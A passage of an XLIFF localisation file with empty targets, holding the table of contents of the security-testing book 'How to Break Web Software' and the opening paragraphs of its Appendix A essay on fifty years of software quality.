        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>The Web Versus Client-Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>A Fault Model for Web Apps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Conclusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch02.html"&gt; Chapter 2.&amp;nbsp;
           Gathering Information on the Target&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch03.html"&gt; Chapter 3.&amp;nbsp;
           Attacking the Client&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch04.html"&gt; Chapter 4.&amp;nbsp;
           State-Based Attacks&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch05.html"&gt; Chapter 5.&amp;nbsp;
           Attacking User-Supplied Input Data&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch06.html"&gt; Chapter 6.&amp;nbsp;
           Language-Based Attacks&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch07.html"&gt; Chapter 7.&amp;nbsp;
           Attacking the Server&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch08.html"&gt; Chapter 8.&amp;nbsp;
           Authentication&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch09.html"&gt; Chapter 9.&amp;nbsp;
           Privacy&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>User Agents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Referrer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Web Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Clipboard Access</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Caching Pages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>ActiveX Controls</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Browser Helper Objects</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="ch10.html"&gt; Chapter 10.&amp;nbsp;
           Web Services&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>What Are Web Services?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Threats</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="app01.html"&gt; Appendix A.&amp;nbsp;
           Fifty Years of Software: Key Principles for Quality&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>1950 to 1959: Genesis</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>1960 to 1969: Exodus</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>1970 to 1979: Chaos</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>1980 to 1989: Repair</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>1990 to 1999: Process</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>2000 to 2009: Engineering?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="app02.html"&gt; Appendix B.&amp;nbsp;
           Flowershop Bugs&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
               &lt;a class="v2" href="app03.html"&gt; Appendix C.&amp;nbsp;
           Tools&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>TextPad</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Nikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Wikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Stunnel</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>BlackWidow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Wget</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>cURL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Paros</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>SPIKE Proxy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>SSLDigger</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>The Human Brain</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;&amp;nbsp;&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.table.tr.td.a.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="head.td.table.tr.td.span.a.img.alt">
          <source>Top</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Appendix A. Fifty Years of Software: Key Principles for Quality</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Appendix A. Fifty Years of Software: Key Principles for Quality</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.span.text">
          <source>&amp;#169; IEEE, 2003. Reprinted with permission of the IEEE.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.span.text">
          <source>James A. Whittaker and Jeffrey M. Voas</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Software quality is no better today than it was decades ago. In some cases, it's worse. Can a look at the past help us change the future for the better?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Five decades of software development have come and gone, and defective software is the norm; high quality, the exception. From the Millennium Bug to holes in network security, through a litany of catastrophic software defects in between: You have to look back and wonder why we still don't have general-purpose technologies that let all programmers write reliable software at a reasonable cost in a reasonable amount of time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At the outset of the 21st century, it seems appropriate to assess the last 50 years. The first experiments in modern programming occurred during World War II, with the 1950s representing the first full decade in which software development took place. From that time up to and including the dawn of this new millennium, we have witnessed a procession of astonishing advances in the types of problems software can solve and the very form that software solutions take. Likewise, software developers' attitudes and work habits have undergone remarkable changes. Technological advances in computer hardware, operating systems, and programming languages have helped shape the software development field. However, social and economic factors have played, perhaps, a larger role by determining how industry used these advances, who ended up using them, and what&amp;mdash;if any&amp;mdash;influence they've had on our ability to produce high-quality software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although a complete catalog of the past 50 years would be impossible in this short article, we can give a decade-by-decade synopsis of software development theory and practice, focusing particularly on attitudes and trends that have shaped current software development methods. Perhaps by examining past trends&amp;mdash;successes and failures&amp;mdash;we can uncover clues as to what avenues to explore in improving future software systems.</source>
          <target></target>
